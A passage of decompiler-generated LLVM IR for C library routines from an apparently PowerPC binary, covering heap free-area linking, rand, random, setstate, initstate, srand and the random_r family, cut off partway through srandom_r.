  %v2_1000b3d8 = add i32 %v2_1000b3b8, %v2_1000b374
  store i32 %v2_1000b3d8, i32* @r29, align 4
  store i32 %v3_1000b3ac, i32* @r31, align 4
  %v5_1000b3e0 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000b3ac, i32 %v0_1000b390.lcssa, i32 %v2_1000b330)
  store i32 %v5_1000b3e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b400

dec_label_pc_1000b3e8:                            ; preds = %dec_label_pc_1000b3b8, %dec_label_pc_1000b3ac
  %v2_1000b3e8 = add i32 %v0_1000b39c.lcssa, %arg3
  store i32 %v2_1000b3e8, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268481536, i32* @lr, align 4
  %v5_1000b3fc = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000b3e8, i32 %v0_1000b390.lcssa, i32 %v3_1000b3ac)
  store i32 %v5_1000b3fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b400

dec_label_pc_1000b400:                            ; preds = %dec_label_pc_1000b384, %dec_label_pc_1000b37c, %dec_label_pc_1000b3cc, %dec_label_pc_1000b390, %dec_label_pc_1000b3e8
  %v0_1000b400 = load i32, i32* @r31, align 4
  store i32 %v0_1000b400, i32* @r30, align 4
  %v0_1000b404 = load i32, i32* @r29, align 4
  %v2_1000b404 = inttoptr i32 %v0_1000b400 to i32*
  store i32 %v0_1000b404, i32* %v2_1000b404, align 4
  br label %dec_label_pc_1000b428

dec_label_pc_1000b40c:                            ; preds = %dec_label_pc_1000b35c, %dec_label_pc_1000b354
  %v2_1000b40c = add i32 %v2_1000b330, -12
  %v3_1000b40c = inttoptr i32 %v2_1000b40c to i32*
  store i32 %arg3, i32* %v3_1000b40c, align 4
  %v0_1000b410 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b410 = add i32 %v0_1000b410, -12
  store i32 %v1_1000b410, i32* @r30, align 4
  %v0_1000b414 = load i32, i32* %r11.global-to-local, align 4
  %v0_1000b418 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b418, i32* %r3.global-to-local, align 4
  %v0_1000b41c = load i32, i32* @r31, align 4
  store i32 268481576, i32* @lr, align 4
  %v4_1000b424 = inttoptr i32 %v0_1000b418 to i32*
  %v5_1000b424 = call i32 @__heap_link_free_area(i32* %v4_1000b424, i32 %v1_1000b410, i32 %v0_1000b414, i32 %v0_1000b41c)
  store i32 %v5_1000b424, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b428

dec_label_pc_1000b428:                            ; preds = %dec_label_pc_1000b400, %dec_label_pc_1000b40c
  %v0_1000b42c = load i32, i32* @r30, align 4
  store i32 %v0_1000b42c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b42c

; uselistorder directives
  uselistorder i32 %v3_1000b3ac, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000b364, { 1, 0 }
  uselistorder i32 %v0_1000b39c.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000b390.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000b340, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000b330, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000b428, { 1, 0 }
  uselistorder label %dec_label_pc_1000b400, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000b33c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000b440 = call i32 @random()
  ret i32 %v0_1000b440

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000b458 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_100233c8.339 to i32), i32* @r29, align 4
  store i32 %v2_1000b458, i32* @r3, align 4
  %v0_1000b470 = call i32 @__pthread_return_void()
  %v0_1000b478 = call i32 @__pthread_return_0()
  %v2_1000b480 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000b488 = call i32 @__GI_random_r(i32* inttoptr (i32 268579808 to i32*), i32 %v2_1000b480)
  store i32 %v2_1000b458, i32* @r3, align 4
  %v0_1000b494 = call i32 @__pthread_return_void()
  %v3_1000b49c = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000b49c
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100233c8.339 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b4d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b4d4, i32* @r3, align 4
  %v0_1000b4dc = call i32 @__pthread_return_void()
  %v0_1000b4e4 = call i32 @__pthread_return_0()
  store i32 268481792, i32* @lr, align 4
  %v3_1000b4fc = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_100233e0)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000b504 = icmp slt i32 %v3_1000b4fc, 0
  store i32 %v2_1000b4d4, i32* @r3, align 4
  br i1 %v1_1000b504, label %dec_label_pc_1000b518, label %dec_label_pc_1000b514

dec_label_pc_1000b514:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_100233e4.343 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b518

dec_label_pc_1000b518:                            ; preds = %entry, %dec_label_pc_1000b514
  %v0_1000b518 = call i32 @__pthread_return_void()
  %v0_1000b520 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000b520

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000b518, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000b544 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b544, i32* @r3, align 4
  %v0_1000b56c = call i32 @__pthread_return_void()
  %v0_1000b574 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268481940, i32* @lr, align 4
  %v4_1000b590 = inttoptr i32 %arg1 to i32*
  %v5_1000b590 = call i32 @__GI_initstate_r(i32* %v4_1000b590, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_100233e0 to i32))
  store i32 %v2_1000b544, i32* @r3, align 4
  %v0_1000b59c = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_100233e4.343 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000b5d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b5d0, i32* @r3, align 4
  %v0_1000b5ec = call i32 @__pthread_return_void()
  %v0_1000b5f4 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_100233e0 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268482056, i32* @lr, align 4
  %v0_1000b604 = call i32 @srandom_r()
  store i32 %v2_1000b5d0, i32* @r3, align 4
  %v0_1000b610 = call i32 @__pthread_return_void()
  ret i32 %v0_1000b610

; uselistorder directives
  uselistorder i32* @global_var_100233e0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100233e0 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000b628 = add i32 %tmp, 12
  %v2_1000b628 = inttoptr i32 %v1_1000b628 to i32*
  %v3_1000b628 = load i32, i32* %v2_1000b628, align 4
  store i32 %v3_1000b628, i32* %r11.global-to-local, align 4
  %v0_1000b62c = load i32, i32* @lr, align 4
  store i32 %v0_1000b62c, i32* %r0.global-to-local, align 4
  %v1_1000b634 = add i32 %arg1, 4
  store i32 %v1_1000b634, i32* %r3.global-to-local, align 4
  %v3_1000b638 = icmp eq i32 %v3_1000b628, 0
  %v1_1000b63c = add i32 %tmp, 8
  %v2_1000b63c = inttoptr i32 %v1_1000b63c to i32*
  %v3_1000b63c = load i32, i32* %v2_1000b63c, align 4
  store i32 %v3_1000b63c, i32* %r9.global-to-local, align 4
  br i1 %v3_1000b638, label %dec_label_pc_1000b648, label %dec_label_pc_1000b650

dec_label_pc_1000b648:                            ; preds = %entry
  %v2_1000b648 = add i32 %v3_1000b63c, -4
  %v3_1000b648 = inttoptr i32 %v2_1000b648 to i32*
  store i32 0, i32* %v3_1000b648, align 4
  br label %dec_label_pc_1000b668

dec_label_pc_1000b650:                            ; preds = %entry
  %v1_1000b650 = add i32 %tmp, 4
  %v2_1000b650 = inttoptr i32 %v1_1000b650 to i32*
  %v3_1000b650 = load i32, i32* %v2_1000b650, align 4
  %v2_1000b654 = sub i32 %v3_1000b650, %v3_1000b63c
  %v4_1000b658 = sdiv i32 %v2_1000b654, 4
  %v1_1000b65c = mul i32 %v4_1000b658, 5
  %v2_1000b660 = add i32 %v1_1000b65c, %v3_1000b628
  store i32 %v2_1000b660, i32* %r0.global-to-local, align 4
  %v2_1000b664 = add i32 %v3_1000b63c, -4
  %v3_1000b664 = inttoptr i32 %v2_1000b664 to i32*
  store i32 %v2_1000b660, i32* %v3_1000b664, align 4
  br label %dec_label_pc_1000b668

dec_label_pc_1000b668:                            ; preds = %dec_label_pc_1000b648, %dec_label_pc_1000b650
  %v0_1000b668 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b668 = add i32 %v0_1000b668, -4
  %v2_1000b668 = inttoptr i32 %v1_1000b668 to i32*
  %v3_1000b668 = load i32, i32* %v2_1000b668, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001273c.344 to i32), i32* %r9.global-to-local, align 4
  %v2_1000b678 = srem i32 %v3_1000b668, 5
  store i32 %v2_1000b678, i32* %r11.global-to-local, align 4
  %v2_1000b688 = icmp ugt i32 %v2_1000b678, 4
  %v1_1000b68c = mul nsw i32 %v2_1000b678, 4
  store i32 %v1_1000b68c, i32* %r0.global-to-local, align 4
  %v2_1000b694 = add i32 %v1_1000b68c, ptrtoint (i32* @global_var_1001273c.344 to i32)
  store i32 %v2_1000b694, i32* %r10.global-to-local, align 4
  br i1 %v2_1000b688, label %dec_label_pc_1000b6f8, label %dec_label_pc_1000b69c

dec_label_pc_1000b69c:                            ; preds = %dec_label_pc_1000b668
  %v3_1000b690 = icmp eq i32 %v2_1000b678, 0
  %v1_1000b69c = add i32 %v1_1000b68c, add (i32 ptrtoint (i32* @global_var_1001273c.344 to i32), i32 20)
  %v2_1000b69c = inttoptr i32 %v1_1000b69c to i32*
  %v3_1000b69c = load i32, i32* %v2_1000b69c, align 4
  store i32 %v3_1000b69c, i32* %r10.global-to-local, align 4
  %v3_1000b6a0 = inttoptr i32 %v2_1000b694 to i32*
  %v4_1000b6a0 = load i32, i32* %v3_1000b6a0, align 4
  store i32 %v4_1000b6a0, i32* %r9.global-to-local, align 4
  %v1_1000b6a4 = mul i32 %v3_1000b69c, 4
  store i32 %v1_1000b6a4, i32* %r0.global-to-local, align 4
  %v2_1000b6a8 = add i32 %tmp, 16
  %v3_1000b6a8 = inttoptr i32 %v2_1000b6a8 to i32*
  store i32 %v3_1000b69c, i32* %v3_1000b6a8, align 4
  %v0_1000b6ac = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b6ac = add i32 %tmp, 20
  %v3_1000b6ac = inttoptr i32 %v2_1000b6ac to i32*
  store i32 %v0_1000b6ac, i32* %v3_1000b6ac, align 4
  %v0_1000b6b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b6b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b6b0 = add i32 %v1_1000b6b0, %v0_1000b6b0
  store i32 %v2_1000b6b0, i32* %r8.global-to-local, align 4
  %v0_1000b6b4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b6b4, i32* %v2_1000b628, align 4
  br i1 %v3_1000b690, label %dec_label_pc_1000b6ec, label %dec_label_pc_1000b6bc

dec_label_pc_1000b6bc:                            ; preds = %dec_label_pc_1000b69c
  %v0_1000b6bc = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b6bc = add i32 %v0_1000b6bc, -4
  %v2_1000b6bc = inttoptr i32 %v1_1000b6bc to i32*
  %v3_1000b6bc = load i32, i32* %v2_1000b6bc, align 4
  %v1_1000b6c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b6c0 = sdiv i32 %v3_1000b6bc, %v1_1000b6c0
  %v1_1000b6c4 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b6c4 = add i32 %v1_1000b6c4, %v2_1000b6c0
  store i32 %v2_1000b6c4, i32* %r9.global-to-local, align 4
  %v1_1000b6c8 = mul i32 %v2_1000b6c0, 4
  %v1_1000b6cc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b6cc = sdiv i32 %v2_1000b6c4, %v1_1000b6cc
  store i32 %v2_1000b6cc, i32* %r11.global-to-local, align 4
  %v2_1000b6d0 = add i32 %v1_1000b6c8, %v0_1000b6bc
  store i32 %v2_1000b6d0, i32* %r0.global-to-local, align 4
  %v2_1000b6d4 = add i32 %tmp, 4
  %v3_1000b6d4 = inttoptr i32 %v2_1000b6d4 to i32*
  store i32 %v2_1000b6d0, i32* %v3_1000b6d4, align 4
  %v0_1000b6d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b6d8 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b6d8 = mul i32 %v1_1000b6d8, %v0_1000b6d8
  store i32 %v2_1000b6d8, i32* %r11.global-to-local, align 4
  %v1_1000b6dc = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b6dc = sub i32 %v1_1000b6dc, %v2_1000b6d8
  %v1_1000b6e0 = mul i32 %v2_1000b6dc, 4
  %v0_1000b6e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000b6e4 = add i32 %v1_1000b6e0, %v0_1000b6e4
  store i32 %v2_1000b6e4, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b6e4, i32* %arg2, align 4
  br label %dec_label_pc_1000b6ec

dec_label_pc_1000b6ec:                            ; preds = %dec_label_pc_1000b69c, %dec_label_pc_1000b6bc
  %v0_1000b6ec = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b6ec = add i32 %tmp, 24
  %v3_1000b6ec = inttoptr i32 %v2_1000b6ec to i32*
  store i32 %v0_1000b6ec, i32* %v3_1000b6ec, align 4
  %v0_1000b6f0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000b6f0, i32* %v2_1000b63c, align 4
  %v0_1000b70c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000b708

dec_label_pc_1000b6f8:                            ; preds = %dec_label_pc_1000b668
  %v0_1000b6f8 = call i32 @__errno_location()
  store i32 %v0_1000b6f8, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000b700 = inttoptr i32 %v0_1000b6f8 to i32*
  store i32 22, i32* %v2_1000b700, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000b708

dec_label_pc_1000b708:                            ; preds = %dec_label_pc_1000b6ec, %dec_label_pc_1000b6f8
  %v0_1000b70c = phi i32 [ %v0_1000b70c.pre, %dec_label_pc_1000b6ec ], [ -1, %dec_label_pc_1000b6f8 ]
  store i32 %v0_1000b62c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b70c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b70c

; uselistorder directives
  uselistorder i32 %v0_1000b70c, { 1, 0 }
  uselistorder i32 %v3_1000b69c, { 1, 0, 2 }
  uselistorder i32 %v1_1000b68c, { 2, 1, 0 }
  uselistorder i32 %v2_1000b678, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 6, 5, 4, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000b708, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000b668, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000b71c = add i32 %tmp, 12
  %v2_1000b71c = inttoptr i32 %v1_1000b71c to i32*
  %v3_1000b71c = load i32, i32* %v2_1000b71c, align 4
  %v1_1000b728 = add i32 %tmp, 8
  %v2_1000b728 = inttoptr i32 %v1_1000b728 to i32*
  %v3_1000b728 = load i32, i32* %v2_1000b728, align 4
  store i32 %v3_1000b728, i32* %r7.global-to-local, align 4
  %v3_1000b72c = icmp eq i32 %v3_1000b71c, 0
  br i1 %v3_1000b72c, label %dec_label_pc_1000b734, label %dec_label_pc_1000b750

dec_label_pc_1000b734:                            ; preds = %entry
  %v1_1000b734 = inttoptr i32 %v3_1000b728 to i32*
  %v2_1000b734 = load i32, i32* %v1_1000b734, align 4
  %v2_1000b738 = mul i32 %v2_1000b734, 1103515245
  %v1_1000b73c = add i32 %v2_1000b738, 12345
  %v1_1000b740 = urem i32 %v1_1000b73c, -2147483648
  store i32 %v1_1000b740, i32* %r9.global-to-local, align 4
  store i32 %v1_1000b740, i32* %v1_1000b734, align 4
  %v0_1000b748 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b748 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000b748, i32* %v2_1000b748, align 4
  br label %dec_label_pc_1000b7a4

dec_label_pc_1000b750:                            ; preds = %entry
  %v2_1000b750 = load i32, i32* %arg1, align 4
  %v1_1000b754 = add i32 %tmp, 4
  %v2_1000b754 = inttoptr i32 %v1_1000b754 to i32*
  %v3_1000b754 = load i32, i32* %v2_1000b754, align 4
  store i32 %v3_1000b754, i32* %r9.global-to-local, align 4
  %v1_1000b758 = add i32 %tmp, 24
  %v2_1000b758 = inttoptr i32 %v1_1000b758 to i32*
  %v3_1000b758 = load i32, i32* %v2_1000b758, align 4
  %v1_1000b75c = add i32 %v2_1000b750, 4
  store i32 %v1_1000b75c, i32* @r8, align 4
  %v1_1000b760 = add i32 %v3_1000b754, 4
  %v1_1000b764 = inttoptr i32 %v3_1000b754 to i32*
  %v2_1000b764 = load i32, i32* %v1_1000b764, align 4
  store i32 %v2_1000b764, i32* %r9.global-to-local, align 4
  %v2_1000b768 = icmp ult i32 %v1_1000b75c, %v3_1000b758
  %v1_1000b770 = inttoptr i32 %v2_1000b750 to i32*
  %v2_1000b770 = load i32, i32* %v1_1000b770, align 4
  store i32 %v1_1000b760, i32* %r10.global-to-local, align 4
  %v2_1000b778 = add i32 %v2_1000b770, %v2_1000b764
  %v1_1000b77c = udiv i32 %v2_1000b778, 2
  store i32 %v1_1000b77c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b778, i32* %v1_1000b770, align 4
  %v0_1000b784 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b784 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000b784, i32* %v2_1000b784, align 4
  br i1 %v2_1000b768, label %dec_label_pc_1000b794, label %dec_label_pc_1000b78c

dec_label_pc_1000b78c:                            ; preds = %dec_label_pc_1000b750
  %v0_1000b78c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000b78c, i32* @r8, align 4
  br label %dec_label_pc_1000b79c

dec_label_pc_1000b794:                            ; preds = %dec_label_pc_1000b750
  %v2_1000b76c = icmp ult i32 %v1_1000b760, %v3_1000b758
  br i1 %v2_1000b76c, label %dec_label_pc_1000b79c, label %dec_label_pc_1000b798

dec_label_pc_1000b798:                            ; preds = %dec_label_pc_1000b794
  %v0_1000b798 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000b798, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b79c

dec_label_pc_1000b79c:                            ; preds = %dec_label_pc_1000b794, %dec_label_pc_1000b78c, %dec_label_pc_1000b798
  %v0_1000b79c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b79c, i32* %v2_1000b754, align 4
  %v0_1000b7a0 = load i32, i32* @r8, align 4
  store i32 %v0_1000b7a0, i32* %arg1, align 4
  br label %dec_label_pc_1000b7a4

dec_label_pc_1000b7a4:                            ; preds = %dec_label_pc_1000b734, %dec_label_pc_1000b79c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000b778, { 1, 0 }
  uselistorder i32 %v1_1000b760, { 1, 0 }
  uselistorder i32 %v3_1000b754, { 1, 0, 2 }
  uselistorder i32 %v1_1000b740, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b7a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b79c, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000b7ac = load i32, i32* @lr, align 4
  %v0_1000b7b8 = load i32, i32* @r4, align 4
  store i32 %v0_1000b7b8, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000b7c4 = add i32 %v0_1000b7b8, 12
  %v2_1000b7c4 = inttoptr i32 %v1_1000b7c4 to i32*
  %v3_1000b7c4 = load i32, i32* %v2_1000b7c4, align 4
  %v2_1000b7c8 = icmp ugt i32 %v3_1000b7c4, 4
  br i1 %v2_1000b7c8, label %dec_label_pc_1000b878, label %dec_label_pc_1000b7d0

dec_label_pc_1000b7d0:                            ; preds = %entry
  %v0_1000b7d0 = load i32, i32* @r3, align 4
  %v3_1000b7d0 = icmp eq i32 %v0_1000b7d0, 0
  %v1_1000b7d4 = add i32 %v0_1000b7b8, 8
  %v2_1000b7d4 = inttoptr i32 %v1_1000b7d4 to i32*
  %v3_1000b7d4 = load i32, i32* %v2_1000b7d4, align 4
  store i32 %v3_1000b7d4, i32* %r10.global-to-local, align 4
  br i1 %v3_1000b7d0, label %dec_label_pc_1000b7dc, label %dec_label_pc_1000b7e0

dec_label_pc_1000b7dc:                            ; preds = %dec_label_pc_1000b7d0
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000b7e0

dec_label_pc_1000b7e0:                            ; preds = %dec_label_pc_1000b7d0, %dec_label_pc_1000b7dc
  %v0_1000b7e4 = phi i32 [ %v0_1000b7d0, %dec_label_pc_1000b7d0 ], [ 1, %dec_label_pc_1000b7dc ]
  %v3_1000b7e0 = icmp eq i32 %v3_1000b7c4, 0
  %v2_1000b7e4 = inttoptr i32 %v3_1000b7d4 to i32*
  store i32 %v0_1000b7e4, i32* %v2_1000b7e4, align 4
  br i1 %v3_1000b7e0, label %dec_label_pc_1000b874, label %dec_label_pc_1000b7ec

dec_label_pc_1000b7ec:                            ; preds = %dec_label_pc_1000b7e0
  %v0_1000b7ec = load i32, i32* @r30, align 4
  %v1_1000b7ec = add i32 %v0_1000b7ec, 16
  %v2_1000b7ec = inttoptr i32 %v1_1000b7ec to i32*
  %v3_1000b7ec = load i32, i32* %v2_1000b7ec, align 4
  store i32 %v3_1000b7ec, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000b804 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_1000b7ec, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000b7ec, 0
  br i1 %tmp18, label %dec_label_pc_1000b840.preheader, label %dec_label_pc_1000b840.preheader.thread

dec_label_pc_1000b840.preheader.thread:           ; preds = %dec_label_pc_1000b7ec
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000b844

dec_label_pc_1000b840.preheader:                  ; preds = %dec_label_pc_1000b7ec
  %v1_1000b8402 = add i32 %v3_1000b7ec, -1
  store i32 %v1_1000b8402, i32* %ctr.global-to-local, align 4
  %v2_1000b8403 = icmp eq i32 %v1_1000b8402, 0
  br i1 %v2_1000b8403, label %dec_label_pc_1000b844, label %dec_label_pc_1000b81c

dec_label_pc_1000b81c:                            ; preds = %dec_label_pc_1000b840.preheader, %dec_label_pc_1000b83c.dec_label_pc_1000b81c_crit_edge
  %v1_1000b83c = phi i32 [ %v2_1000b83c, %dec_label_pc_1000b83c.dec_label_pc_1000b81c_crit_edge ], [ %v0_1000b804, %dec_label_pc_1000b840.preheader ]
  %v1_1000b81c = phi i32 [ %v1_1000b81c.pre, %dec_label_pc_1000b83c.dec_label_pc_1000b81c_crit_edge ], [ 127773, %dec_label_pc_1000b840.preheader ]
  %v0_1000b81c = load i32, i32* @r3, align 4
  %v2_1000b81c = sdiv i32 %v0_1000b81c, %v1_1000b81c
  %v2_1000b820 = mul i32 %v2_1000b81c, %v1_1000b81c
  %v2_1000b824 = sub i32 %v0_1000b81c, %v2_1000b820
  %v1_1000b828 = mul i32 %v2_1000b81c, 2836
  store i32 %v1_1000b828, i32* %r0.global-to-local, align 4
  %v1_1000b82c = mul i32 %v2_1000b824, 16807
  %v2_1000b830 = sub i32 %v1_1000b82c, %v1_1000b828
  store i32 %v2_1000b830, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000b830, -1
  br i1 %tmp19, label %dec_label_pc_1000b83c, label %dec_label_pc_1000b838

dec_label_pc_1000b838:                            ; preds = %dec_label_pc_1000b81c
  %v1_1000b838 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b838 = add i32 %v1_1000b838, %v2_1000b830
  store i32 %v2_1000b838, i32* @r3, align 4
  br label %dec_label_pc_1000b83c

dec_label_pc_1000b83c:                            ; preds = %dec_label_pc_1000b81c, %dec_label_pc_1000b838
  %v0_1000b83c = phi i32 [ %v2_1000b830, %dec_label_pc_1000b81c ], [ %v2_1000b838, %dec_label_pc_1000b838 ]
  %v2_1000b83c = add i32 %v1_1000b83c, 4
  %v3_1000b83c = inttoptr i32 %v2_1000b83c to i32*
  store i32 %v0_1000b83c, i32* %v3_1000b83c, align 4
  %v0_1000b840 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b840 = add i32 %v0_1000b840, -1
  store i32 %v1_1000b840, i32* %ctr.global-to-local, align 4
  %v2_1000b840 = icmp eq i32 %v1_1000b840, 0
  br i1 %v2_1000b840, label %dec_label_pc_1000b840.dec_label_pc_1000b844_crit_edge, label %dec_label_pc_1000b83c.dec_label_pc_1000b81c_crit_edge

dec_label_pc_1000b83c.dec_label_pc_1000b81c_crit_edge: ; preds = %dec_label_pc_1000b83c
  %v1_1000b81c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000b81c

dec_label_pc_1000b840.dec_label_pc_1000b844_crit_edge: ; preds = %dec_label_pc_1000b83c
  %v0_1000b844.pre = load i32, i32* @r30, align 4
  %v0_1000b848.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000b84c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b844

dec_label_pc_1000b844:                            ; preds = %dec_label_pc_1000b840.preheader.thread, %dec_label_pc_1000b840.dec_label_pc_1000b844_crit_edge, %dec_label_pc_1000b840.preheader
  %v0_1000b84c = phi i32 [ %v0_1000b84c.pre, %dec_label_pc_1000b840.dec_label_pc_1000b844_crit_edge ], [ %v0_1000b804, %dec_label_pc_1000b840.preheader ], [ %v0_1000b804, %dec_label_pc_1000b840.preheader.thread ]
  %v0_1000b848 = phi i32 [ %v0_1000b848.pre, %dec_label_pc_1000b840.dec_label_pc_1000b844_crit_edge ], [ %v3_1000b7ec, %dec_label_pc_1000b840.preheader ], [ %v3_1000b7ec, %dec_label_pc_1000b840.preheader.thread ]
  %v1_1000b84c = phi i32 [ %v0_1000b844.pre, %dec_label_pc_1000b840.dec_label_pc_1000b844_crit_edge ], [ %v0_1000b7ec, %dec_label_pc_1000b840.preheader ], [ %v0_1000b7ec, %dec_label_pc_1000b840.preheader.thread ]
  %v1_1000b844 = add i32 %v1_1000b84c, 20
